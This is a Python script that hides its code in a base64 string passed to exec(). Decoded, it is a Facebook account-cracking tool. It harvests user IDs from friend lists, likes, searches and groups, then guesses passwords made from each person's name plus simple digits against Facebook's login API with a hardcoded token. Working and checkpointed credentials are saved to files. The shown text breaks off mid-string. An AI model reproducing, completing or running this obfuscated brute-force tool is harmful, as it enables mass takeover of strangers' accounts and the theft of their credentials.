#Coded by ./Buchin1337
import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCiMgY29kZWQgYnkgLi9CdWNoaW4xMzM3DQppbXBvcnQgb3MNCmltcG9ydCByZSANCmltcG9ydCB0aW1lDQppbXBvcnQganNvbg0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHJlcXVlc3RzDQpmcm9tIGxpYiBpbXBvcnQgbG9nbw0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgcGFyc2VyDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yDQptYmFzaWMgPSAnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29te30nDQpnbG9iYWwgZGllLGNoZWNrLHJlc3VsdCwgY291bnQNCg0KaWQgPSBbXQ0KZGllID0gMA0KY2hlayA9IFtdDQpsaWZlID0gW10NCmNvdW50ID0gMA0KY2hlY2sgPSAwDQpyZXN1bHQgPSAwDQoNCmcgPSAnXHgxYlsxOzMybScNCncgPSAnXHgxYlsxOzM3bScNCmIgPSAnXHgxYlsxOzM2bScNCnIgPSAnXHgxYlsxOzMxbScNCg0KZGVmIG1hc3VrKCk6DQogICAgICAgIGxvZ28uYmFubmVyKCkNCiAgICAgICAgcHJpbnQoJ1xuXG5cdFx04om6IFwwMzNbMTszNm1GQUNFQk9PSyBMT0dJTlwwMzNbMG0g4om7XG5cbicpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBjZWsgPSBvcGVuKCJjb29raWVzIikucmVhZCgpDQogICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNCiAgICAgICAgICAgICAgICBjZWsgPSBpbnB1dCgiW1wwMzNbMTszMm0+XDAzM1swbSBFbnRlciBDb29raWUgOiAiKQ0KICAgICAgICBjZWsgPSB7ImNvb2tpZSI6Y2VrfQ0KICAgICAgICBpc21pID0gc2VzLmdldChtYmFzaWMuZm9ybWF0KCIvbWUiLHZlcmlmeT1GYWxzZSksY29va2llcz1jZWspLmNvbnRlbnQNCiAgICAgICAgaWYgIm1iYXNpY19sb2dvdXRfYnV0dG9uIiBpbiBzdHIoaXNtaSk6DQogICAgICAgICAgICAgICAgaWYgIkFwYSB5YW5nIEFuZGEgcGlraXJrYW4gc2VrYXJhbmciIGluIHN0cihpc21pKToNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigiY29va2llcyIsInciKSBhcyBmOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGNla1siY29va2llIl0pDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIjIENoYW5nZSB0aGUgbGFuZ3VhZ2UsIHBsZWFzZSB3YWl0ISEiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0cy5nZXQobWJhc2ljLmZvcm1hdChwYXJzZXIoaXNtaSwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixzdHJpbmc9IkJhaGFzYSBJbmRvbmVzaWEiKVsiaHJlZiJdKSxjb29raWVzPWNlaykNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICMgcGxlYXNlIGRvbid0IHJlbW92ZSB0aGlzIG9yIGNoYW5nZQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWt1dGkgPSBwYXJzZXIocmVxdWVzdHMuZ2V0KG1iYXNpYy5mb3JtYXQoIi9hbmJpYS5zYW5zIiksY29va2llcz1jZWspLmNvbnRlbnQsImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJJa3V0aSIpWyJocmVmIl0NCiAgICAgICAgICAgICAgICAgICAgICAgIHNlcy5nZXQobWJhc2ljLmZvcm1hdChpa3V0aSksY29va2llcz1jZWspDQogICAgICAgICAgICAgICAgZXhjZXB0IDoNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MgDQogICAgICAgICAgICAgICAgcmV0dXJuIGNla1siY29va2llIl0NCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgZXhpdCgiIyBjb29raWVzIGludmFsaWQiKQ0KZGVmIGxvZ2luKHVzZXJuYW1lLHBhc3N3b3JkLGNlaz1GYWxzZSk6DQogICAgICAgIGdsb2JhbCBkaWUsY2hlY2sscmVzdWx0LGNvdW50DQogICAgICAgIGIgPSAiMzUwNjg1NTMxNzI4JTdDNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzIiDQogICAgICAgIHBhcmFtcyA9IHsNCiAgICAgICAgICAgICAgICAnYWNjZXNzX3Rva2VuJzogYiwNCiAgICAgICAgICAgICAgICAnZm9ybWF0JzogJ0pTT04nLA0KICAgICAgICAgICAgICAgICdzZGtfdmVyc2lvbic6ICcyJywNCiAgICAgICAgICAgICAgICAnZW1haWwnOiB1c2VybmFtZSwNCiAgICAgICAgICAgICAgICAnbG9jYWxlJzogJ2VuX1VTJywNCiAgICAgICAgICAgICAgICAncGFzc3dvcmQnOiBwYXNzd29yZCwNCiAgICAgICAgICAgICAgICAnc2RrJzogJ2lvcycsDQogICAgICAgICAgICAgICAgJ2dlbmVyYXRlX3Nlc3Npb25fY29va2llcyc6ICcxJywNCiAgICAgICAgICAgICAgICAnc2lnJzogJzNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JywNCiAgICAgICAgfQ0KICAgICAgICBhcGkgPSAnaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4nDQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGFwaSwgcGFyYW1zPXBhcmFtcykNCiAgICAgICAgaWYgJ0VBQScgaW4gcmVzcG9uc2UudGV4dDoNCiAgICAgICAgICAgICAgICBwcmludChmIlxyW1wwMzNbMTszMm1MSUZFXDAzM1swbV0ge3VzZXJuYW1lfSA9PiB7cGFzc3dvcmR9ICAgICAgICAgICAgICAgICAgICAgICAiLGVuZD0iIikNCiAgICAgICAgICAgICAgICBwcmludCgpDQogICAgICAgICAgICAgICAgcmVzdWx0ICs9IDENCiAgICAgICAgICAgICAgICBpZiBjZWs6DQogICAgICAgICAgICAgICAgICAgICAgICBsaWZlLmFwcGVuZCh1c2VybmFtZSsifCIrcGFzc3dvcmQpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigncmVzdWx0cy1saWZlLnR4dCcsJ2EnKSBhcyBmOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHVzZXJuYW1lICsgJ3wnICsgcGFzc3dvcmQgKyAnXG4nKQ0KICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiByZXNwb25zZS5qc29uKClbJ2Vycm9yX21zZyddOg0KICAgICAgICAgICAgICAgIHByaW50KGYiXHJbXDAzM1sxOzkxbUNIRUtcMDMzWzBtXSB7dXNlcm5hbWV9ID0+IHtwYXNzd29yZH0gICAgICAgICAgICAgICAgICAgICIsZW5kPSIiKQ0KICAgICAgICAgICAgICAgIHByaW50KCkNCiAgICAgICAgICAgICAgICBjaGVjayArPSAxDQogICAgICAgICAgICAgICAgaWYgY2VrOg0KICAgICAgICAgICAgICAgICAgICAgICAgY2hlay5hcHBlbmQodXNlcm5hbWUrInwiK3Bhc3N3b3JkKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ3Jlc3VsdHMtY2hlY2sudHh0JywnYScpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUodXNlcm5hbWUgKyAnfCcgKyBwYXNzd29yZCArICdcbicpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgZGllICs9IDENCiAgICAgICAgZm9yIGkgaW4gbGlzdCgnXHwvLeKAoicpOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJcclt7aX1dIExpZmUgOiAoe3N0cihyZXN1bHQpfSkgY2hlY2twb2ludCA6ICh7c3RyKGNoZWNrKX0pIGRpZSA6ICh7c3RyKGRpZSl9KSIsZW5kPSIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjIpDQpkZWYgZ2V0aWQodXJsKToNCiAgICAgICAgcmF3ID0gcmVxdWVzdHMuZ2V0KHVybCxjb29raWVzPWt1a2kpLmNvbnRlbnQNCiAgICAgICAgZ2V0dXNlciA9IHJlLmZpbmRhbGwoJ21pZGRsZSI+PGEgY2xhc3M9Ii4uIiBocmVmPSIoLio/KSI+KC4qPyk8L2E+JyxzdHIocmF3KSkNCiAgICAgICAgZm9yIHggaW4gZ2V0dXNlcjoNCiAgICAgICAgICAgICAgICBpZiAncHJvZmlsZScgaW4geFswXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh4WzFdICsgJ3wnICsgcmUuZmluZGFsbCgiPShcZCopPyIsc3RyKHhbMF0pKVswXSkNCiAgICAgICAgICAgICAgICBlbGlmICdmcmllbmRzJyBpbiB4Og0KICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHhbMV0gKyAnfCcgKyB4WzBdLnNwbGl0KCcvJylbMV0uc3BsaXQoJz8nKVswXSkNCiAgICAgICAgICAgICAgICBwcmludCgnXHIjICcgKyBzdHIobGVuKGlkKSkgKyAiIHJldHJpZXZlZCIsZW5kPSIiKQ0KICAgICAgICBpZiAnTGloYXQgVGVtYW4gTGFpbicgaW4gc3RyKHJhdyk6DQogICAgICAgICAgICAgICAgZ2V0aWQobWJhc2ljLmZvcm1hdChwYXJzZXIocmF3LCdodG1sLnBhcnNlcicpLmZpbmQoJ2EnLHN0cmluZz0nTGloYXQgVGVtYW4gTGFpbicpWydocmVmJ10pKQ0KICAgICAgICByZXR1cm4gaWQNCmRlZiBmcm9tbGlrZXModXJsKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGxpa2UgPSByZXF1ZXN0cy5nZXQodXJsLGNvb2tpZXM9a3VraSkuY29udGVudA0KICAgICAgICAgICAgICAgIGxvdmUgPSByZS5maW5kYWxsKCdocmVmPSIoL3VmaS4qPykiJyxzdHIobGlrZSkpWzBdDQogICAgICAgICAgICAgICAgYXdzID0gZ2V0bGlrZShtYmFzaWMuZm9ybWF0KGxvdmUpKQ0KICAgICAgICAgICAgICAgIHJldHVybiBhd3MNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIGV4aXQoIiMgY2FudCBkdW1wIGlkICIpDQpkZWYgZ2V0bGlrZShyZWFjdCk6DQogICAgICAgIGxpa2UgPSByZXF1ZXN0cy5nZXQocmVhY3QsY29va2llcz1rdWtpKS5jb250ZW50DQogICAgICAgIGlkcyAgPSByZS5maW5kYWxsKCdjbGFzcz0iYi4iPjxhIGhyZWY9IiguKj8pIj4oLio/KTwvYT48L2gzPicsc3RyKGxpa2UpKQ0KICAgICAgICBmb3IgdXNlciBpbiBpZHM6DQogICAgICAgICAgICAgICAgaWYgJ3Byb2ZpbGUnIGluIHVzZXJbMF06DQogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQodXNlclsxXSArICJ8IiArIHJlLmZpbmRhbGwoIj0oXGQqKSIsc3RyKHVzZXJbMF0pKVswXSkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyB1c2VyWzBdLnNwbGl0KCcvJylbMV0pDQogICAgICAgICAgICAgICAgcHJpbnQoZidcciMge3N0cihsZW4oaWQpKX0gcmV0cmlldmVkJyxlbmQ9IiIpDQogICAgICAgIGlmICdMaWhhdCBTZWxlbmdrYXBueWEnIGluIHN0cihsaWtlKToNCiAgICAgICAgICAgICAgICBnZXRsaWtlKG1iYXNpYy5mb3JtYXQocGFyc2VyKGxpa2UsJ2h0bWwucGFyc2VyJykuZmluZCgnYScsc3RyaW5nPSJMaWhhdCBTZWxlbmdrYXBueWEiKVsiaHJlZiJdKSkNCiAgICAgICAgcmV0dXJuIGlkDQpkZWYgYnlzZWFyY2gob3B0aW9uKToNCiAgICAgICAgc2VhcmNoID0gcmVxdWVzdHMuZ2V0KG9wdGlvbixjb29raWVzPWt1a2kpLmNvbnRlbnQNCiAgICAgICAgdXNlcnMgPSByZS5maW5kYWxsKCdjbGFzcz0ieCBjaCI+PGEgaHJlZj0iLyguKj8pIj48ZGl2Lio/Y2xhc3M9ImNqIj4oLio/KTwvZGl2Picsc3RyKHNlYXJjaCkpDQogICAgICAgIGZvciB1c2VyIGluIHVzZXJzOg0KICAgICAgICAgICAgICAgIGlmICJwcm9maWxlIiBpbiB1c2VyWzBdOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyByZS5maW5kYWxsKCI9KFxkKikiLHN0cih1c2VyWzBdKSlbMF0pDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgdXNlclswXS5zcGxpdCgiPyIpWzBdKQ0KICAgICAgICAgICAgICAgIHByaW50KGYiXHIjIHtzdHIobGVuKGlkKSl9IHJldHJpZXZlZCAiLGVuZD0iIikNCiAgICAgICAgaWYgIkxpaGF0IEhhc2lsIFNlbGFuanV0bnlhIiBpbiBzdHIoc2VhcmNoKToNCiAgICAgICAgICAgICAgICBieXNlYXJjaChwYXJzZXIoc2VhcmNoLCdodG1sLnBhcnNlcicpLmZpbmQoImEiLHN0cmluZz0iTGloYXQgSGFzaWwgU2VsYW5qdXRueWEiKVsiaHJlZiJdKQ0KICAgICAgICByZXR1cm4gaWQNCmRlZiBncnViaWQoZW5kcG9pbnQpOg0KICAgICAgICBncmFiID0gcmVxdWVzdHMuZ2V0KGVuZHBvaW50LGNvb2tpZXM9a3VraSkuY29udGVudA0KICAgICAgICB1c2VycyA9IHJlLmZpbmRhbGwoJ2EgY2xhc3M9Ii4uIiBocmVmPSIvKC4qPykiPiguKj8pPC9hPicsc3RyKGdyYWIpKQ0KICAgICAgICBmb3IgdXNlciBpbiB1c2VyczoNCiAgICAgICAgICAgICAgICBpZiAicHJvZmlsZSIgaW4gdXNlclswXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgcmUuZmluZGFsbCgnaWQ9KFxkKiknLHN0cih1c2VyWzBdKSlbMF0pDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgdXNlclswXSkNCiAgICAgICAgICAgICAgICBwcmludChmIlxyIyB7c3RyKGxlbihpZCkpfSByZXRyaWV2ZWQgIixlbmQ9IiIpDQogICAgICAgIGlmICJMaWhhdCBTZWxlbmdrYXBueWEiIGluIHN0cihncmFiKToNCiAgICAgICAgICAgICAgICBncnViaWQobWJhc2ljLmZvcm1hdChwYXJzZXIoZ3JhYiwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixzdHJpbmc9IkxpaGF0IFNlbGVuZ2thcG55YSIpWyJocmVmIl0pKQ0KICAgICAgICByZXR1cm4gaWQNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImdpdCBwdWxsIikNCiAgICAgICAgICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgICAgICBrdWtpcyA9IG1hc3VrKCkNCiAgICAgICAgICAgICAgICBrdWtpID0geydjb29raWUnOmt1a2lzfQ0KICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgICAgICAgICAgICAgIHByaW50KCdcblxuXHRcdOKJuiBcMDMzWzE7MzZtRkFDRUJPT0sgVE9PTEtJVFwwMzNbMG0g4om7XG5cbicpDQogICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5MW3ilKPilIEgXDAzM1swbVtcMDMzWzE7MzJtMVwwMzNbMG1dIExpc3QgZnJpZW5kcycpDQogICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5MW3ilKPilIFcMDMzWzBtIFtcMDMzWzE7MzJtMlwwMzNbMG1dIENyYWNrIEZyb20gTGlrZXNcMDMzWzE7OTFtICcpDQogICAgICAgICAgICAgICAgcHJpbnQoJ+KUo+KUgSBcMDMzWzBtW1wwMzNbMTszMm0zXDAzM1swbV0gQ3JhY2sgRnJvbSBTZWFyY2ggTmFtZScpDQogICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5MW3ilKPilIEgXDAzM1swbVtcMDMzWzE7MzJtNFwwMzNbMG1dIENyYWNrIEZyb20gZ3JvdXAgJykNCiAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkxbeKUo+KUgSBcMDMzWzBtW1wwMzNbMTszMm01XDAzM1swbV0gQ3JhY2sgRnJvbSBmcmllbmQnKQ0KICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTFt4pSj4pSBIFwwMzNbMG1bXDAzM1sxOzMybTZcMDMzWzBtXSBSZXN1bHRzIGNoZWNrJykNCiAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkxbeKUl1wwMzNbMG1cbicpDQogICAgICAgICAgICAgICAgcHJpbnQoKQ0KICAgICAgICAgICAgICAgIHRhbnlhID0gaW5wdXQoJ+KemyAnKQ0KICAgICAgICAgICAgICAgIGlmIHRhbnlhID09IiI6DQogICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJbIV0gRG9udCBiZSBlbXB0eSIpDQogICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnMSc6DQogICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSBwYXJzZXIoc2VzLmdldChtYmFzaWMuZm9ybWF0KCcvbWUnKSxjb29raWVzPWt1a2kpLmNvbnRlbnQsJ2h0bWwucGFyc2VyJykuZmluZCgnYScsc3RyaW5nPSdUZW1hbicpDQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGdldGlkKG1iYXNpYy5mb3JtYXQodXJsWyJocmVmIl0pKQ0KICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzInOg0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBpbnB1dCgiIyB1cmwgOiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdXNlcm5hbWUgPT0gIiI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiMgRG9udCBiZSBlbXB0eSIpDQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2snIGluIHVzZXJuYW1lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gdXNlcm5hbWUucmVwbGFjZSgnd3d3LmZhY2Vib29rJywnbWJhc2ljLmZhY2Vib29rJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJ20uZmFjZWJvb2suY29tJyBpbiB1c2VybmFtZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHVzZXJuYW1lLnJlcGxhY2UoJ20uZmFjZWJvb2suY29tJywnbWJhc2ljLmZhY2Vib29rLmNvbScpDQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGZyb21saWtlcyh1c2VybmFtZSkgDQogICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnMyc6DQogICAgICAgICAgICAgICAgICAgICAgICB6ZXQgPSBpbnB1dCgiIyBxdWVyeSA6ICIpDQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGJ5c2VhcmNoKG1iYXNpYy5mb3JtYXQoJy9zZWFyY2gvcGVvcGxlLz9xPScremV0KSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih1c2VybmFtZSkgPT0gMDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyBubyByZXN1bHQiKQ0KICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzQnOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiMgY2FuIG9ubHkgdGFrZSAxMDAgSURzICIpDQogICAgICAgICAgICAgICAgICAgICAgICBncmFiID0gaW5wdXQoIiMgSUQgZ3JvdXAgOiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBncnViaWQobWJhc2ljLmZvcm1hdCgiL2Jyb3dzZS9ncm91cC9tZW1iZXJzLz9pZD0iICsgZ3JhYikpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4odXNlcm5hbWUpID09IDA6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiMgSUQgd3JvbmciKQ0KICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzUnOg0KICAgICAgICAgICAgICAgICAgICAgICAgemV0ID0gaW5wdXQoIiMgZW50ZXIgdXNlcm5hbWUvSWQgOiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgemV0LmlzZGlnaXQoKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9ICIvcHJvZmlsZS5waHA/aWQ9IiArIHpldA0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9ICIvIiArIHpldA0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gcGFyc2VyKHJlcXVlc3RzLmdldChtYmFzaWMuZm9ybWF0KHVzZXIpLGNvb2tpZXM9a3VraSkuY29udGVudCwiaHRtbC5wYXJzZXIiKS5maW5kKCdhJyxzdHJpbmc9IlRlbWFuIilbImhyZWYiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGdldGlkKG1iYXNpYy5mb3JtYXQodXNlcikpDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgVHlwZUVycm9yOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIHVzZXIgbm90IGZvdW5kICIpDQogICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnNic6DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUxID0gb3BlbigicmVzdWx0cy1jaGVjay50eHQiKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZTIgPSBvcGVuKCJyZXN1bHRzLWxpZmUudHh0IikucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEgPSBmaWxlMSArIGZpbGUyDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbmFsID0gYS5zdHJpcCgpLnNwbGl0KCJcbiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbmFsID0gc2V0KGZpbmFsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIiMge3N0cihsZW4oZmluYWwpKX0gYWNjb3VudHMgdG8gY2hlY2sgIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MTApIGFzIGV4Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB1c2VyIGluIGZpbmFsOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYSA9IHVzZXIuc3BsaXQoInwiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXguc3VibWl0KGxvZ2luLChhWzBdKSwoYVsxXSksKFRydWUpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoInJlc3VsdHMtY2hlY2sudHh0IikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKCJyZXN1bHRzLWxpZmUudHh0IikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gbGlmZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ3Jlc3VsdHMtbGlmZS50eHQnLCdhJykgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoeCsnXG4nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgeCBpbiBjaGVrOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigncmVzdWx0cy1jaGVjay50eHQnLCdhJykgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoeCsiXG4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxuIyBEb25lIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiMgc2F2ZWQgdG8gcmVzdWx0cy1jaGVjay50eHQgcmVzdWx0cy1saWZlLnR4dCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIHlvdSBub3QgaGF2ZSBhIHJlc3VsdHMiKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIHdyb25nIGNob2ljZSIpDQogICAgICAgICAgICAgICAgcHJpbnQoKQ0KICAgICAgICAgICAgICAgIGV4cGFzcyA9IGlucHV0KCJbXDAzM1sxOzMybT5cMDMzWzBtXSBFeHRyYSBQYXNzd29yZCA6ICIpDQogICAgICAgICAgICAgICAgcHJpbnQoIiMgcmVzdWx0IHdpbGwgYmUgc2F2ZWQgaW4gcmVzdWx0cy1saWZlLnR4dCBhbmQgcmVzdWx0cy1jaGVjay50eHQiKQ0KICAgICAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBleDoNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB1c2VyIGluIHVzZXJuYW1lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VycyA9IHVzZXIuc3BsaXQoJ3wnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzcyA9IHVzZXJzWzBdLnNwbGl0KCcgJykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gc3M6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlzdHBhc3MgPSBbDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHIoeCkgKyAnMTIzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cih4KSArICcxMjM0NScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHIoeCkgKyAnMTIzNDU2JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cih4KSArICcxMicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlzdHBhc3MuYXBwZW5kKGV4cGFzcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgcGFzc3cgaW4gc2V0KGxpc3RwYXNzKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4LnN1Ym1pdChsb2dpbiwodXNlcnNbMV0pLChwYXNzdykpDQogICAgICAgICAgICAgICAgaWYgY2hlY2sgIT0gMCBvciByZXN1bHQgIT0gMDoNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcbltcMDMzWzE7MzJt4pyUXDAzM1swbSBEb25lLiBmaWxlIHNhdmVkIGluIDogIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIgICAgICAgIC0gbGlmZSA6IHJlc3VsdHMtbGlmZS50eHQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiAgICAgICAgLSBjaGVja3BvaW50I